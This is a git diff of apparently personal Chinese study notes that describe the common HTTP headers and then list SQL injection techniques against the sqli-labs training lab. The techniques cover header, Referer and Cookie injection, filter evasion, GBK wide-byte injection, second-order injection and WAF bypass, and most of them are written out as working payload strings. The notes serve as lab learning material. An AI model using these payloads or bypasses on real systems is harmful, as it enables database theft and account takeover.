@@ -189,51 +189,243 @@ uname=' union select 1,group_concat(schema_name) from information_schema.schemat
 
 # HTTP头
 HTTP 头部详解 
+
 1、 Accept：告诉WEB服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该 类型下的所有子类型，type/sub-type。 
+
 2、 Accept-Charset： 浏览器申明自己接收的字符集  
-      Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩， 支持什么压缩方法（gzip，deflate） 
-      Accept-Language：：浏览器申明自己接收的语言 语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。 
+
+ Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩， 支持什么压缩方法（gzip，deflate） 
+ 
+     Accept-Language：：浏览器申明自己接收的语言 语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。 
+
 3、 Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的 一部分）的请求。bytes：表示接受，none：表示不接受。 
+
 4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现 在经过多长时间了。 
+
 5、 Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该 头部来回应自己的身份验证信息给WEB服务器。 
+
 6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从WEB服务器去取） max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象） max-stale：（可以接受过去的对象，但是过期时间必须小于 max-stale 值） min-fresh：（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象） 响应：public(可以用 Cached 内容回应任何用户) private（只能用缓存内容回应先前请求该内容的那个用户） no-cache（可以缓存，但是只有在跟WEB服务器验证了其有效后，才能返回给客户端） max-age：（本响应包含的对象的过期时间） ALL: no-store（不允许缓存） 
+
 7、 Connection：请求：close（告诉WEB 服务器或者代理服务器，在完成本次请求的响应 后，断开连接，不要等待本次连接的后续请求了）。 keepalive（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待 本次连接的后续请求）。 响应：close（连接已经关闭）。 keepalive（连接保持着，在等待本次连接的后续请求）。 Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间 （秒）。例如：Keep-Alive：300 
+
 8、 Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应 中的对象。例如：Content-Encoding：gzip 
+
 9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言
+
 10、Content-Length：WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length: 26012 
+
 11、Content-Range：WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如： Content-Range: bytes 21010-47021/47022 
+
 12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type： application/xml 
+
 13、 ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个 html 文件， 如果被修改了，其 Etag 也会别修改，所以ETag 的作用跟 Last-Modified 的作用差不多，主 要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给WEB 服务器， 然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有 没有改变了。 
+
 14、 Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟 WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires： Sat, 23 May2009 10:02:12 GMT 
+
 15、 Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号。例如：Host： rss.sina.com.cn 
+
 16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的 动作。 
+
 17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求 的动作。 
+
 18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动 作（比如返回对象），否则返回代码304，告诉浏览器 该对象没有修改。例如： If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT 
+
 19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求 的动作（比如返回对象）。 
+
 20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分 给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己 所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一 起使用。 
+
 21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动 态页面的最后产生时间等等。例如：Last-Modified：Tue,06May200802:42:43GMT 
+
 22、 Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头 部 指 定 的 位 置 去 取 。 例 如 ： Location ： http://i0.sinaimg.cn /dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif 
+
 23、Pramga：主要使用 Pramga:no-cache，相当于 Cache-Control：no-cache。例如：Pragma： no-cache 
+
 24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。 Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。 
+
 25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪 部分。例如：Range:bytes=1173546 
+
 26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中 的网址/URL。例如：Referer：http://www.sina.com/ 
+
 27、 Server:WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix) 
+
 28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14 
+
 29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作 了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding:chunked 
+
 30、 Vary: WEB 服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所 返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的 头部为：Content-Encoding: gzip; Vary: Content-Encoding 那么 Cache 服务器会分析后续请求 消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用 相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应 给不具备解压能力的浏览器。例如：Vary：Accept-Encoding 
+
 31、 Via： 列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么 协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发 出的请求里面添 加 Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并 把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。例如：Via：1.0236.D0707195.sina.com.cn:80 (squid/2.6.STABLE13)  
 
 
+
 ## uagent注入
+
 以sqlilabs第十八关为例
+
+
 源码中将useragent和IP插入到数据库中：
+
 $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";  
+
 使用burpsuite修改uagent：
+
 User-Agent: 1' or updatexml(1,concat('~',(select database())),3),2,3)  #
 
 ## referer注入
+
 sqlilabs第十九关为例
+
 Referer: ' or extractvale(1,concat('~',(select database()))),2) #
 ## cookie注入
+
 sqlilabs第二十关为例
+
 Cookie: uname=an' union select 1,database(),3 #
+
+
+# 过滤绕过
+
+## 注释符过滤绕过
+
+'#'  '--' '%23' 被过滤时
+
+手动闭合 
+
+构造等式
+
+单引号闭合
+
+?id=1' and '1'='1
+
+?id=-1' union select 1,2,3 and '1'='1
+
+http://192.168.1.10:8081/Less-23/index.php?id=-1' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and '1'='1
+
+此处最好将查询语句放在子查询中，防止数据库将最后的and语句识别到from语句中
+
+## and和or过滤绕过
+
+大小写绕过
+
+?id=1' aNd 1=1 --+
+
+复写绕过
+
+?id=1' anandd 1=1 --+
+
+&&取代and，||取代or
+
+?id=1' && 1=1 --+
+
+使用符号时最好使用url编码
+
+## 空格过滤绕过
+
+使用 +，%20，%09，%0A，%0C，%0B，%0C，%0D，%A0 代替空格
+
+或是使用报错注入：
+
+?id=1'||extractvalue(1,concat('~',(database())))||'1'='1
+
+?id=1'||extractvalue(1,concat('~',(select(substr(group_concat(schema_name),31,61))from(infoorrmation_schema.schemata))))||'1'='1
+
+使用括号
+
+## 逗号过滤绕过
+
+使用join
+
+union select 1,2,3 #等价于
+
+union select * from (select 1)a join (select 2)b join (select 3)c
+
+示例：
+
+?id=-1 union select * from (select 1)a join (select 2)b join (select database())c --+
+
+注：逗号被过滤，查询数据时不可以使用常用语句group_concat(username,password) 要分开查询
+
+## 宽字节注入
+
+addslashes()函数，在指定的预定义字符（'，"，\，NUL）前添加反斜杠\，使字符失去原本的作用
+
+宽字节注入可用前提：数据库编码方式使GBKB编码
+
+字符\的ASCII码为5C，可以和其他字符组合成汉字进行宽字节注入，如：0xdf，%815c，%825c，%835c
+
+输入%df',单引号被转化为%5c，整体变成%df%5c，符合GBK取值范围，会被解析成一个汉字，单引号恢复作用
+
+示例：
+
+?id=-1%df' union select 1,2,3 --+
+
+# 二次排序注入
+
+可登录+注册的网页，可以尝试 注册一个admin’#的账号，接下来登录该帐号后进行修改密码。此时 修改的就是admin的密码。  
+
+# 防火墙绕过
+
+## /*!90000b*/
+
+/*!90000benben*/数据库版本高于9.0才会执行benben命令（不可能）以此尝试绕过waf
+
+示例：
+
+已知目标服务器过滤了union select 
+
+可以使用union /*!90000benben*/ select 绕过waf
+
+判断是数字型还是字符型：
+
+?id=2-1
+
+面对防火墙时不要一次性写全命令，方便检查那些语句被拦截
+
+示例：
+
+?id=-1' union select //被过滤
+
+?id=-1' union /*!90000benben*/ select 1,2,3 --+
+
+?id=-1' union /*!90000benben*/ select 1,2,group_concat() --+
+
+?id=-1' union /*!90000benben*/ select 1,2,group_concat(table_name) --+
+
+?id=-1' union /*!90000benben*/ select 1,2,group_concat(table_name) from --+ //被过滤，测试破坏from或select可以绕过，推测select...from后面不可以跟字符
+
+?id=-1' union /*!90000benben*/ select 1,2,group_concat(table_name) /*!benben*/ from --+
+
+?id=-1' union /*!90000benben*/ select 1,2,group_concat(table_name) /*!benben*/ from information_schema.tables --+
+
+?id=-1' union /*!90000benben*/ select 1,2,group_concat(table_name) /*!benben*/ from information_schema.tables where --+
+
+?id=-1' union /*!90000benben*/ select 1,2,group_concat(table_name) /*!benben*/ from information_schema.tables where table_schema --+
+
+?id=-1' union /*!90000benben*/ select 1,2,group_concat(table_name) /*!benben*/ from information_schema.tables where table_schema=database(/*!90000benben*/) --+
+
+## --+b%0A
+
+--+为注释符，%0A为换行符，假装将后续内容注释掉绕过waf
+
+?id=-1' union select 1,2,3 --+ //被过滤
+
+?id=-1' union --+b%0A select 1,2,3 --+
+
+?id=-1' union --+b%0A select 1,2,database() --+ //被过滤
+
+?id=-1' union --+b%0A select 1,2,database(/*!90000b*/) --+
+
+?id=-1' union --+b%0A select 1,2,group_concat(table_name) --+
+
+?id=-1' union --+b%0A select 1,2,group_concat(table_name) from --+
+
+?id=-1' union --+b%0A select 1,2,group_concat(table_name) from in --+ //被过滤，同上，select from后不可出现字符
+
+?id=-1' union --+b%0A select 1,2,group_concat(table_name) --+b%0A from infromation --+
+
+?id=-1' union --+b%0A select 1,2,group_concat(table_name) --+b%0A from infromation_schema --+ //被过滤，此处直接测试?id=-1' information_schema同样被过滤，所以此处过滤的是information_schema 用sys.schema_table_statistics_with_buffer替换
+
+?id=-1' union --+b%0A select 1,2,group_concat(table_name) --+b%0A from sys.schema_table_statistics_with_buffer where table_schema='security' --+ 
+
+
+
